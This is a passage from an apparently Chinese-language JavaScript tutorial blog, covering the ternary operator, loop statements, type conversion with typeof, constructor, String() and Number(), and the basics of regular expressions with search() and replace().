age 中的值小于 18，则向变量 voteable 赋值 “年龄太小”，否则赋值 “年龄已达到”。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">voteable=(age&lt;<span class="hljs-number">18</span>)?<span class="hljs-string">&quot;年龄太小&quot;</span>:<span class="hljs-string">&quot;年龄已达到&quot;</span>;<br></code></pre></div></td></tr></table></figure><h2 id="3-JavaScript-流程语句"><a href="#3-JavaScript-流程语句" class="headerlink" title="3.JavaScript 流程语句"></a>3.JavaScript 流程语句</h2><p>同其他编程语言中的使用方法一样，这里不再记录。</p><h3 id="3-1-if…else-语句"><a href="#3-1-if…else-语句" class="headerlink" title="3.1 if…else 语句"></a>3.1 if…else 语句</h3><h3 id="3-2-三目运算（三元运算）-语句"><a href="#3-2-三目运算（三元运算）-语句" class="headerlink" title="3.2 三目运算（三元运算） 语句"></a>3.2 三目运算（三元运算） 语句</h3><h3 id="3-3-switch"><a href="#3-3-switch" class="headerlink" title="3.3 switch"></a>3.3 switch</h3><h3 id="3-4-for"><a href="#3-4-for" class="headerlink" title="3.4 for"></a>3.4 for</h3><h3 id="3-5-for-in-循环遍历对象的属性"><a href="#3-5-for-in-循环遍历对象的属性" class="headerlink" title="3.5 for/in - 循环遍历对象的属性"></a>3.5 for/in - 循环遍历对象的属性</h3><p>for in循环不仅可以遍历对象的属性，还可以遍历数组。<br>使用实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person=&#123;<span class="hljs-attr">fname</span>:<span class="hljs-string">&quot;John&quot;</span>,<span class="hljs-attr">lname</span>:<span class="hljs-string">&quot;Doe&quot;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">25</span>&#125;;<br><br><span class="hljs-keyword">for</span> (x <span class="hljs-keyword">in</span> person)&#123;<br>  txt=txt + person[x];<br>  &#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-6-while"><a href="#3-6-while" class="headerlink" title="3.6 while"></a>3.6 while</h3><h3 id="3-7-do-while"><a href="#3-7-do-while" class="headerlink" title="3.7 do/while"></a>3.7 do/while</h3><h3 id="3-8-Break-和-Continue"><a href="#3-8-Break-和-Continue" class="headerlink" title="3.8 Break 和 Continue"></a>3.8 Break 和 Continue</h3><h2 id="4-JavaScript-类型转换"><a href="#4-JavaScript-类型转换" class="headerlink" title="4.JavaScript 类型转换"></a>4.JavaScript 类型转换</h2><p>JavaScript有 5 种不同的数据类型：string、number、boolean、object、function；<br>3 种对象类型：Object、Date、Array；<br>2 个不包含任何值的数据类型：null、undefined。</p><p>类型转换分为：Number() 转换为数字， String() 转换为字符串， Boolean() 转化为布尔值。</p><p>JavaScript 变量可以转换为新变量或其他数据类型：通过使用 JavaScript 函数、通过 JavaScript 自身自动转换。</p><h3 id="4-1-typeof-操作符"><a href="#4-1-typeof-操作符" class="headerlink" title="4.1 typeof 操作符"></a>4.1 typeof 操作符</h3><p>可以使用 typeof 操作符来查看 JavaScript 变量的数据类型。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-string">&quot;John&quot;</span>                 <span class="hljs-comment">// 返回 string</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-number">3.14</span>                   <span class="hljs-comment">// 返回 number</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">NaN</span>                    <span class="hljs-comment">// 返回 number</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">false</span>                  <span class="hljs-comment">// 返回 boolean</span><br><span class="hljs-keyword">typeof</span> [ <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]              <span class="hljs-comment">// 返回 object</span><br><span class="hljs-keyword">typeof</span> &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-attr">age</span>:<span class="hljs-number">34</span>&#125;  <span class="hljs-comment">// 返回 object</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>()             <span class="hljs-comment">// 返回 object</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;&#125;         <span class="hljs-comment">// 返回 function</span><br><span class="hljs-keyword">typeof</span> myCar                  <span class="hljs-comment">// 返回 undefined (if myCar is not declared)</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">null</span>                   <span class="hljs-comment">// 返回 object</span><br></code></pre></div></td></tr></table></figure><p>NaN 的数据类型是 number；数组(Array)的数据类型是 object；日期(Date)的数据类型为 object；null 的数据类型是 object；未定义变量的数据类型为 undefined；如果对象是 JavaScript Array 或 JavaScript Date ，我们就无法通过 typeof 来判断他们的类型，因为都是 返回 Object。</p><h3 id="4-2-constructor-属性"><a href="#4-2-constructor-属性" class="headerlink" title="4.2 constructor 属性"></a>4.2 constructor 属性</h3><p><code>constructor</code> 属性返回所有 JavaScript 变量的构造函数。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-string">&quot;John&quot;</span>.constructor                 <span class="hljs-comment">// 返回函数 String()  &#123; [native code] &#125;</span><br>(<span class="hljs-number">3.14</span>).constructor                 <span class="hljs-comment">// 返回函数 Number()  &#123; [native code] &#125;</span><br><span class="hljs-literal">false</span>.constructor                  <span class="hljs-comment">// 返回函数 Boolean() &#123; [native code] &#125;</span><br>[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>, <span class="hljs-number">3</span>,<span class="hljs-number">4</span>].constructor              <span class="hljs-comment">// 返回函数 Array()   &#123; [native code] &#125;</span><br>&#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-attr">age</span>:<span class="hljs-number">34</span>&#125;.constructor  <span class="hljs-comment">// 返回函数 Object()  &#123; [native code] &#125;</span><br><span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().constructor             <span class="hljs-comment">// 返回函数 Date()    &#123; [native code] &#125;</span><br><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;.constructor         <span class="hljs-comment">// 返回函数 Function()&#123; [native code] &#125;</span><br></code></pre></div></td></tr></table></figure><p>可以使用 <code>constructor</code> 属性来查看对象是否为数组 (包含字符串 “Array”)。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isArray</span>(<span class="hljs-params">myArray</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> myArray.constructor.toString().indexOf(<span class="hljs-string">&quot;Array&quot;</span>) &gt; -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以使用 constructor 属性来查看是对象是否为日期 (包含字符串 “Date”)。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isDate</span>(<span class="hljs-params">myDate</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> myDate.constructor.toString().indexOf(<span class="hljs-string">&quot;Date&quot;</span>) &gt; -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-3-数字转换为字符串"><a href="#4-3-数字转换为字符串" class="headerlink" title="4.3 数字转换为字符串"></a>4.3 数字转换为字符串</h3><p>全局方法 String() 可以将数字转换为字符串。该方法可用于任何类型的数字，字母，变量，表达式。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">String</span>(x)         <span class="hljs-comment">// 将变量 x 转换为字符串并返回</span><br><span class="hljs-built_in">String</span>(<span class="hljs-number">123</span>)       <span class="hljs-comment">// 将数字 123 转换为字符串并返回</span><br><span class="hljs-built_in">String</span>( <span class="hljs-number">100</span>+ <span class="hljs-number">23</span>)  <span class="hljs-comment">// 将数字表达式转换为字符串并返回</span><br></code></pre></div></td></tr></table></figure><p>Number 方法 toString() 也有同样的效果。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">x.toString()<br>(<span class="hljs-number">123</span>).toString()<br>(<span class="hljs-number">100</span> + <span class="hljs-number">23</span>).toString()<br></code></pre></div></td></tr></table></figure><p><strong>其他Number方法</strong></p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">toExponential()</td><td align="center">把对象的值转换为指数计数法。</td></tr><tr><td align="center">toFixed()</td><td align="center">把数字转换为字符串，结果的小数点后有指定位数的数字。</td></tr><tr><td align="center">toPrecision()</td><td align="center">把数字格式化为指定的长度。</td></tr></tbody></table><h3 id="4-4-布尔值转换为字符串"><a href="#4-4-布尔值转换为字符串" class="headerlink" title="4.4 布尔值转换为字符串"></a>4.4 布尔值转换为字符串</h3><p>全局方法 String() 可以将布尔值转换为字符串。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">String</span>(<span class="hljs-literal">false</span>)        <span class="hljs-comment">// 返回 &quot;false&quot;</span><br><span class="hljs-built_in">String</span>(<span class="hljs-literal">true</span>)         <span class="hljs-comment">// 返回 &quot;true&quot;</span><br></code></pre></div></td></tr></table></figure><p>Boolean 方法 toString() 也有相同的效果。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-literal">false</span>.toString()     <span class="hljs-comment">// 返回 &quot;false&quot;</span><br><span class="hljs-literal">true</span>.toString()      <span class="hljs-comment">// 返回 &quot;true&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-5-日期转换为字符串"><a href="#4-5-日期转换为字符串" class="headerlink" title="4.5 日期转换为字符串"></a>4.5 日期转换为字符串</h3><p>全局方法 String() 可以将日期转换为字符串。<br>实例：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">String</span>(Date())      // 返回 Thu Jul <span class="hljs-number">17</span> <span class="hljs-number">2014</span> <span class="hljs-number">15</span>:<span class="hljs-number">38</span>:<span class="hljs-number">19</span> GMT+<span class="hljs-number">0200</span> (W. Europe Daylight Time)<br></code></pre></div></td></tr></table></figure><p>Date 方法 toString() 也有相同的效果。<br>实例：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Date</span>().toString()   // 返回 Thu Jul <span class="hljs-number">17</span> <span class="hljs-number">2014</span> <span class="hljs-number">15</span>:<span class="hljs-number">38</span>:<span class="hljs-number">19</span> GMT+<span class="hljs-number">0200</span> (W. Europe Daylight Time)<br></code></pre></div></td></tr></table></figure><p><strong>其他查看关于日期转换为字符串的函数</strong></p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">getDate()</td><td align="center">从 Date 对象返回一个月中的某一天 (1 ~ 31)。</td></tr><tr><td align="center">getDay()</td><td align="center">从 Date 对象返回一周中的某一天 (0 ~ 6)。</td></tr><tr><td align="center">getFullYear()</td><td align="center">从 Date 对象以四位数字返回年份。</td></tr><tr><td align="center">getHours()</td><td align="center">返回 Date 对象的小时 (0 ~ 23)。</td></tr><tr><td align="center">getMilliseconds()</td><td align="center">返回 Date 对象的毫秒(0 ~ 999)。</td></tr><tr><td align="center">getMinutes()</td><td align="center">返回 Date 对象的分钟 (0 ~ 59)。</td></tr><tr><td align="center">getMonth()</td><td align="center">从 Date 对象返回月份 (0 ~ 11)。</td></tr><tr><td align="center">getSeconds()</td><td align="center">返回 Date 对象的秒数 (0 ~ 59)。</td></tr><tr><td align="center">getTime()</td><td align="center">返回 1970 年 1 月 1 日至今的毫秒数。</td></tr></tbody></table><h3 id="4-6-字符串转换为数字"><a href="#4-6-字符串转换为数字" class="headerlink" title="4.6 字符串转换为数字"></a>4.6 字符串转换为数字</h3><p>全局方法 Number() 可以将字符串转换为数字。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">Number</span>(<span class="hljs-string">&quot;3.14&quot;</span>)    <span class="hljs-comment">// 返回 3.14</span><br><span class="hljs-built_in">Number</span>(<span class="hljs-string">&quot; &quot;</span>)       <span class="hljs-comment">// 返回 0</span><br><span class="hljs-built_in">Number</span>(<span class="hljs-string">&quot;&quot;</span>)        <span class="hljs-comment">// 返回 0</span><br><span class="hljs-built_in">Number</span>(<span class="hljs-string">&quot;99 88&quot;</span>)   <span class="hljs-comment">// 返回 NaN</span><br></code></pre></div></td></tr></table></figure><p>更多关于字符串转为数字的方法：</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">parseFloat()</td><td align="center">解析一个字符串，并返回一个浮点数。</td></tr><tr><td align="center">parseInt()</td><td align="center">解析一个字符串，并返回一个整数。</td></tr></tbody></table><h3 id="4-7-一元运算符"><a href="#4-7-一元运算符" class="headerlink" title="4.7 一元运算符 +"></a>4.7 一元运算符 +</h3><p>Operator + 可用于将变量转换为数字。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> y = <span class="hljs-string">&quot;5&quot;</span>;      <span class="hljs-comment">// y 是一个字符串</span><br><span class="hljs-keyword">var</span> x = + y;      <span class="hljs-comment">// x 是一个数字</span><br></code></pre></div></td></tr></table></figure><p>如果变量不能转换，它仍然会是一个数字，但值为 NaN (不是一个数字)。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> y = <span class="hljs-string">&quot;John&quot;</span>;   <span class="hljs-comment">// y 是一个字符串</span><br><span class="hljs-keyword">var</span> x = + y;      <span class="hljs-comment">// x 是一个数字 (NaN)</span><br></code></pre></div></td></tr></table></figure><h3 id="4-8-布尔值转换为数字"><a href="#4-8-布尔值转换为数字" class="headerlink" title="4.8 布尔值转换为数字"></a>4.8 布尔值转换为数字</h3><p>全局方法 Number() 可将布尔值转换为数字。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">Number</span>(<span class="hljs-literal">false</span>)     <span class="hljs-comment">// 返回 0</span><br><span class="hljs-built_in">Number</span>(<span class="hljs-literal">true</span>)      <span class="hljs-comment">// 返回 1</span><br></code></pre></div></td></tr></table></figure><h3 id="4-9-日期转换为数字"><a href="#4-9-日期转换为数字" class="headerlink" title="4.9 日期转换为数字"></a>4.9 日期转换为数字</h3><p>全局方法 Number() 可将日期转换为数字。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();<br><span class="hljs-built_in">Number</span>(d)          <span class="hljs-comment">// 返回 1404568027739</span><br></code></pre></div></td></tr></table></figure><p>日期方法 getTime() 也有相同的效果。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();<br>d.getTime()        <span class="hljs-comment">// 返回 1404568027739</span><br></code></pre></div></td></tr></table></figure><h3 id="4-10-自动转换类型"><a href="#4-10-自动转换类型" class="headerlink" title="4.10 自动转换类型"></a>4.10 自动转换类型</h3><p>当 JavaScript 尝试操作一个 “错误” 的数据类型时，会自动转换为 “正确” 的数据类型。<br>实例：</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span>+ null    // 返回 <span class="hljs-number">5</span>         because null is converted <span class="hljs-keyword">to</span> <span class="hljs-number">0</span><br><span class="hljs-string">&quot;5&quot;</span> + null  // 返回<span class="hljs-string">&quot;5null&quot;</span>   because null is converted <span class="hljs-keyword">to</span> <span class="hljs-string">&quot;null&quot;</span><br><span class="hljs-string">&quot;5&quot;</span> + <span class="hljs-number">1</span>     // 返回 <span class="hljs-string">&quot;51&quot;</span>      because <span class="hljs-number">1</span> is converted <span class="hljs-keyword">to</span> <span class="hljs-string">&quot;1&quot;</span> <br><span class="hljs-string">&quot;5&quot;</span> - <span class="hljs-number">1</span>     // 返回 <span class="hljs-number">4</span>         because <span class="hljs-string">&quot;5&quot;</span> is converted <span class="hljs-keyword">to</span> <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><h3 id="4-11-自动转换为字符串"><a href="#4-11-自动转换为字符串" class="headerlink" title="4.11 自动转换为字符串"></a>4.11 自动转换为字符串</h3><p>尝试输出一个对象或一个变量时 JavaScript 会自动调用变量的 toString() 方法。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML = myVar;<br><br><span class="hljs-comment">// if myVar = &#123;name:&quot;Fjohn&quot;&#125;  // toString 转换为 &quot;[object Object]&quot;</span><br><span class="hljs-comment">// if myVar = [1,2,3,4]       // toString 转换为 &quot;1,2,3,4&quot;</span><br><span class="hljs-comment">// if myVar = new Date()      // toString 转换为 &quot;Fri Jul 18 2014 09:08:55 GMT+0200&quot;</span><br></code></pre></div></td></tr></table></figure><p>数字和布尔值也经常相互转换：<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">// if myVar = 123             // toString 转换为 &quot;123&quot;</span><br><span class="hljs-comment">// if myVar = true            // toString 转换为 &quot;true&quot;</span><br><span class="hljs-comment">// if myVar = false           // toString 转换为 &quot;false&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-12-null"><a href="#4-12-null" class="headerlink" title="4.12 null"></a>4.12 null</h3><p>在 JavaScript 中 null 表示 “什么都没有”，是一个只有一个值的特殊类型，表示一个空对象引用。当设置为“null”时，可以用来清空对象。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 值为 null(空), 但类型为对象</span><br></code></pre></div></td></tr></table></figure><p>可以使用 typeof 检测 null 返回是object。</p><h3 id="4-13-undefined"><a href="#4-13-undefined" class="headerlink" title="4.13 undefined"></a>4.13 undefined</h3><p>在 JavaScript 中 undefined 是一个没有设置值的变量。如果一个变量没有设置值的话，就会返回 undefined。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person; <span class="hljs-comment">// 值为 undefined(空), 类型是undefined</span><br></code></pre></div></td></tr></table></figure><h2 id="5-JavaScript-正则表达式"><a href="#5-JavaScript-正则表达式" class="headerlink" title="5.JavaScript 正则表达式"></a>5.JavaScript 正则表达式</h2><p>正则表达式（英语：Regular Expression，在代码中常简写为regex、regexp或RE）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。搜索模式可用于文本搜索和文本替换。</p><p>正则表达式是由一个字符序列形成的搜索模式。当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容。正则表达式可以是一个简单的字符，或一个更复杂的模式。可用于所有文本搜索和文本替换的操作。</p><p>语法：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/pattern/m</span>odifiers;<br></code></pre></div></td></tr></table></figure><p>实例：</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> patt = <span class="hljs-regexp">/tothefor/i</span><br></code></pre></div></td></tr></table></figure><p>/tothefor/i  是一个正则表达式。tothefor  是一个模式 (用于检索)。i  是一个修饰符 (搜索不区分大小写)。</p><h3 id="5-1-使用字符串方法"><a href="#5-1-使用字符串方法" class="headerlink" title="5.1 使用字符串方法"></a>5.1 使用字符串方法</h3><p>在 JavaScript 中，正则表达式通常用于两个字符串方法 : search() 和 replace()。</p><p>search() 方法 用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子字符串的起始位置。<br>replace() 方法 用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子字符串。</p><h4 id="5-1-1-search-方法使用正则表达式"><a href="#5-1-1-search-方法使用正则表达式" class="headerlink" title="5.1.1 search() 方法使用正则表达式"></a>5.1.1 search() 方法使用正则表达式</h4><p>使用实例：使用正则表达式搜索 “tothefor” 字符串，且不区分大小写：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;Visit tothefor&quot;</span>;<br><span class="hljs-keyword">var</span> n = str.search(<span class="hljs-regexp">/tothefor/i</span>);<br><span class="hljs-comment">/*输出结果*/</span><br><span class="hljs-number">6</span><br></code></pre></div></td></tr></table></figure><h4 id="5-1-2-search-方法使用字符串"><a href="#5-1-2-search-方法使用字符串" class="headerlink" title="5.1.2 search() 方法使用字符串"></a>5.1.2 search() 方法使用字符串</h4><p>search 方法可使用字符串作为参数。字符串参数会转换为正则表达式。<br>使用实例：检索字符串中 “tothefor” 的子字符串：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;Visit tothefor!&quot;</span>;<br><span class="hljs-keyword">var</span> n = str.search(<span class="hljs-string">&quot;tothefor&quot;</span>);<br></code></pre></div></td></tr></table></figure><h4 id="5-1-3-replace-方法使用正则表达式"><a href="#5-1-3-replace-方法使用正则表达式" class="headerlink" title="5.1.3 replace() 方法使用正则表达式"></a>5.1.3 replace() 方法使用正则表达式</h4><p>使用实例：使用正则表达式且不区分大小写将字符串中的 Microsoft 替换为 tothefor :</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;Visit Microsoft!&quot;</span>;<br><span class="hljs-keyword">var</span> res = str.replace(<span class="hljs-regexp">/microsoft/i</span>, <span class="hljs-string">&quot;tothefor&quot;</span>);<br><span class="hljs-comment">/*输出结果*/</span><br>Visit tothefor!<br></code></pre></div></td></tr></table></figure><h4 id="5-1-4-replace-方法使用字符串"><a href="#5-1-4-replace-方法使用字符串" class="headerlink" title="5.1.4 replace() 方法使用字符串"></a>5.1.4 replace() 方法使用字符串</h4><p>replace() 方法将接收字符串作为参数。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;Visit Microsoft!&quot;</span>;<br><span class="hljs-keyword">var</span> res = str.replace(<span class="hljs-string">&quot;Microsoft&quot;</span>, <span class="hljs-string">&quot;tothefor&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>正则表达式参数可用在以上方法中 (替代字符串参数)。正则表达式使得搜索功能更加强大(如实例中不区分大小写)。</p><h3 id="5-2-正则表达式修饰符"><a href="#5-2-正则表达式修饰符" class="headerlink" title="5.2 正则表达式修饰符"></a>5.2 正则表达式修饰符</h3><p>修饰符 可以在全局搜索中不区分大小写。</p><table><thead><tr><th align="center">修饰符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">i</td><td align="center">执行对大小写不敏感的匹配。</td></tr><tr><td align="center">g</td><td align="center">执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td></tr><tr><td align="center">m</td><td align="center">执行多行匹配。</td></tr></tbody></table><h3 id="5-3-正则表达式模式"><a href="#5-3-正则表达式模式" class="headerlink" title="5.3 正则表达式模式"></a>5.3 正则表达式模式</h3><blockquote><ol><li>方括号用于查找某个范围内的字符。</li></ol></blockquote><table><thead><tr><th align="center">表达式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">[abc]</td><td align="center">查找方括号之间的任何字符。</td></tr><tr><td align="center">[0-9]</td><td align="center">查找任何从 0 至 9 的数字。</td></tr><tr><td align="center">(x|y)</td><td align="center">查找任何以 | 分隔的选项。</td></tr></tbody></table><blockquote><ol start="2"><li>元字符是拥有特殊含义的字符。</li></ol></blockquote><table><thead><tr><th align="center">元字符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">\d</td><td align="center">查找数字。</td></tr><tr><td align="center">\s</td><td align="center">查找空白字符。</td></tr><tr><td align="center">\b</td><td align="center">匹配单词边界。</td></tr><tr><td align="center">\uxxxx</td><td align="center">查找以十六进制数 xxxx 规定的 Unicode 字符。</td></tr></tbody></table><blockquote><ol start="3"><li>量词。</li></ol></blockquote><table><thead><tr><th align="center">量词</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">n+</td><td align="center">匹配任何包含至少一个 <em>n</em> 的字符串。</td></tr><tr><td align="center">n*</td><td align="center">匹配任何包含零个或多个 <em>n</em> 的字符串。</td></tr><tr><td align="center">n?</td><td align="center">匹配任何包含零个或一个 <em>n</em> 的字符串。</td></tr></tbody></table><h3 id="5-4-使用-RegExp-对象"><a href="#5-4-使用-RegExp-对象" class="headerlink" title="5.4 使用 RegExp 对象"></a>5.4 使用 RegExp 对象</h3><p>在 JavaScript 中，RegExp 对象是一个预定义了属性和方法的正则表达式对象。</p><h4 